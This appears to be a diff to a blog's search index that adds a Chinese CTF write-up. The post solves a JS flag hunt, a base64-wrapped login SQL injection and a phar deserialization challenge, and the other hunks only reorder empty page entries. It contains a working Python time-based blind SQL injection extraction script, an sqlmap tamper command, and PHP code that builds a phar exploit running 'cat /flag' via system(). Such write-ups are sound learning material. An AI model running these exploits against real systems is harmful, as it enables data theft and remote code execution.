@@ -4,6 +4,39 @@
   
   
   <entry>
+    <title>海洋大学CTF</title>
+    <link href="/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/"/>
+    <url>/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/</url>
+    
+    <content type="html"><![CDATA[<h2 id="合成大晦气"><a href="#合成大晦气" class="headerlink" title="合成大晦气"></a>合成大晦气</h2><p>js里找到flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/736d3094cd3cbd89.png">      </p><h2 id="白给密码"><a href="#白给密码" class="headerlink" title="白给密码"></a>白给密码</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cf263d59e13cbc37.png">    </p><p>sql注入，不过这道题对username和password进行base64编码；抓包后万能密码得到flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/38a0b2749921b598.png">        </p><h2 id="Deep♂Dark♂Database"><a href="#Deep♂Dark♂Database" class="headerlink" title="Deep♂Dark♂Database"></a>Deep♂Dark♂Database</h2><p>上一道题的环境，不过还有flag，应该在数据库里；最简单的时间盲注，什么也没过滤   </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> datetimeurl=<span class="hljs-string">&#x27;http://39.106.29.44:10424/&#x27;</span>flag=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">80</span>):    s=<span class="hljs-number">30</span>    l=<span class="hljs-number">127</span>    mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(s&lt;l):        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        payload=<span class="hljs-string">&quot;1&#x27; or if((ascii(substr((select flag from ctf.flag limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        pay=base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))        payl=<span class="hljs-built_in">str</span>(pay)        print(payload)        data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:payl[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]&#125;        time1=datetime.datetime.now()        re=requests.post(url=url,data=data)        time2=datetime.datetime.now()        tem=(time2-time1).seconds        <span class="hljs-keyword">if</span>(tem&gt;<span class="hljs-number">3</span>):            s=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            l=mid        mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)</code></pre></code></pre><p>或者直接sqlmap也可，sqlmap里有对payload进行base64编码的tamper；我还傻傻的写了个     </p><p><code>sqlmap -r post.txt -tamper=base64encode --dbs</code>     </p><p>得到的flag  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/4b21694a0b481003.png">     </p><p>hex解码–&gt;base64解码—&gt;<code>flag&#123;U_fffxnd_an0th3r&#125;</code>      </p><h2 id="CheckIn-Web"><a href="#CheckIn-Web" class="headerlink" title="CheckIn_Web"></a>CheckIn_Web</h2><p>代码审计     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;secret.php&#x27;</span>);    $iipp = $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];    $filePath = <span class="hljs-string">&#x27;./uploads/&#x27;</span>.md5($iipp);    $filePath_2 = $filePath.<span class="hljs-string">&#x27;/test.txt&#x27;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))    &#123;        <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;write&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;            <span class="hljs-keyword">if</span>(!file_exists($filePath))&#123;                 mkdir($filePath);                &#125;            $res = file_put_contents($filePath_2, base64_decode(($_POST[<span class="hljs-string">&#x27;content&#x27;</span>])));            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Successful!&quot;</span>.<span class="hljs-string">&quot; your path is &quot;</span>.$filePath_2);        &#125;        <span class="hljs-keyword">elseif</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;check&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>])) &#123;            <span class="hljs-keyword">if</span>(file_exists($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>]))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);        &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>感觉没啥可利用的，写入也是写进<code>txt</code>文件<br>有个<code>secret.php</code>但直接访问什么也没有，不会了  </p><p>在同学的提示下扫了下目录，这种代码审计题要扫目录是我没想到的，发现有git泄露     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e702e3223ebaadad.png">     </p><p>git下来<code>secret.php</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/d7f283100df9a35b.png">      </p><p>一个类，eval命令执行    </p><p>但没有序列化，反序列化的点    </p><p><code>phar://</code>反序列化     </p><p>源码中<code>elseif</code>中的<code>file_exists</code>支持phar协议；所以传入<code>filepath=phar://+文件路径</code>即可     </p><p>生成phar文件      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;        <span class="hljs-keyword">public</span> $cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> TestObject();$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp2.phar&quot;</span>); <span class="hljs-comment">//.phar文件</span>$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//固定的</span>$phar-&gt;setMetadata($a); <span class="hljs-comment">//触发的头是C1e4r类，所以传入C1e4r对象</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//随便写点什么生成个签名</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>因为phar文件中有一些不可见字符，不能直接复制粘贴进行base64编码    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$path=<span class="hljs-string">&#x27;exp.phar&#x27;</span>;$fp=fopen($path,<span class="hljs-string">&#x27;rb&#x27;</span>);<span class="hljs-comment">//以二进制打开文件</span>$content=fread($fp,filesize($path));  <span class="hljs-comment">//读取文件</span>$content=base64_encode($content);<span class="hljs-keyword">echo</span> $content;</code></pre></code></pre><p>上传    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/1e37b0a8f12043a0.png">      </p><p>访问     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/02fdc9258601b902.png"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>php</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>WP</tag>
+      
+      <tag>php</tag>
+      
+      <tag>sql</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>GetShell</title>
     <link href="/2021/05/19/BUU87/"/>
     <url>/2021/05/19/BUU87/</url>
@@ -2356,6 +2389,17 @@
   
   
   <entry>
+    <title>404</title>
+    <link href="/"/>
+    <url>/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>关于</title>
     <link href="/"/>
     <url>/</url>
@@ -2367,7 +2411,7 @@
   
   
   <entry>
-    <title>404</title>
+    <title>Categories</title>
     <link href="/"/>
     <url>/</url>
     
@@ -2389,28 +2433,6 @@
   
   
   <entry>
-    <title>Categories</title>
-    <link href="/"/>
-    <url>/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Categories</title>
-    <link href="/"/>
-    <url>/</url>
-    
-    <content type="html"><![CDATA[]]></content>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>分类</title>
     <link href="/"/>
     <url>/</url>
@@ -2422,7 +2444,7 @@
   
   
   <entry>
-    <title>Friends</title>
+    <title>Categories</title>
     <link href="/"/>
     <url>/</url>
     
@@ -2444,7 +2466,7 @@
   
   
   <entry>
-    <title>标签</title>
+    <title>Friends</title>
     <link href="/"/>
     <url>/</url>
     
@@ -2456,6 +2478,17 @@
   
   <entry>
     <title>Tags</title>
+    <link href="/"/>
+    <url>/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>标签</title>
     <link href="/"/>
     <url>/</url>
     
